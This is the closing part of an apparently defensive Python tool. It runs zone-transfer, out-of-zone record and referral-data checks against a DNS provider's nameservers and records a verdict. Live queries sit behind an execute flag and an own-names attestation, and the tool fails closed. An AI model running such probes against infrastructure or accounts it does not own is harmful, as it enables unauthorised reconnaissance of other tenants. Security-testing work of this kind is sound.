    run.add_argument("--repeats", type=int, default=2)
    run.add_argument("--execute", action="store_true",
                     help="perform live queries against YOUR provider NS IPs")
    run.add_argument("--acknowledge-own-names", action="store_true",
                     help="attest: every name and account used is yours (see the checklist)")
    args = parser.parse_args()

    if args.selftest:
        return selftest()
    if not args.command:
        parser.error("choose plan, preflight, run, or --selftest")
    cfg = load_config(args.config)
    if args.command == "plan":
        print(plan_text(cfg))
        return 0
    if args.command == "preflight":
        rows = preflight(cfg)
        for row in rows:
            print(row["status"] + " [" + row["scope"] + "] " + row["description"])
        print("Dry run only: no provider, DNS, or account was contacted.")
        return 1 if any(row["status"] == "BLOCKED" for row in rows) else 0
    # run
    rows = preflight(cfg)
    blocked = [row for row in rows if row["status"] == "BLOCKED"]
    if not args.execute:
        print("dry run: plan only, nothing contacted. Use --execute on your own account.")
        print(plan_text(cfg))
        return 0
    if blocked or not args.acknowledge_own_names:
        raise GapBError("live run refused (fail closed):\n" + "\n".join(
            row["description"] for row in blocked) +
            ("\n--acknowledge-own-names is required" if not args.acknowledge_own_names else ""))
    targets = [{"name": "ns", "ip": ip, "port": cfg["provider"].get("ns_port", 53)}
               for ip in cfg["provider"]["ns_ips"]]
    if not targets:
        raise GapBError("provider.ns_ips is empty: record the assigned NS IPs first")
    results = {"transfer": check_transfer(cfg, targets), "f1": check_f1(cfg, targets),
               "f2": check_f2(cfg, targets, repeats=args.repeats)}
    results["cross_delegation"] = cross_delegation_check(cfg, results["f2"])
    cross_tenant = "cross-delegation" if results["cross_delegation"]["status"] == "positive" else "none"
    verdict = decide_verdict(results, cross_tenant=cross_tenant)
    raw = {"f1-outofzone-owner.txt": json.dumps(results["f1"], indent=2),
           "f2-referral-additional.txt": json.dumps(results["f2"], indent=2)}
    row = write_evidence(args.evidence_dir, cfg, results, verdict, cross_tenant, raw_files=raw)
    print(json.dumps({"verdict": row["verdict"], "f1_store": row["f1_store"],
                      "f2_emit": row["f2_emit"], "cross_tenant": row["cross_tenant"],
                      "evidence": str(args.evidence_dir)}, indent=2))
    return 0


if __name__ == "__main__":
    try:
        sys.exit(main())
    except GapBError as exc:
        print("ERROR: " + str(exc), file=sys.stderr)
        sys.exit(1)
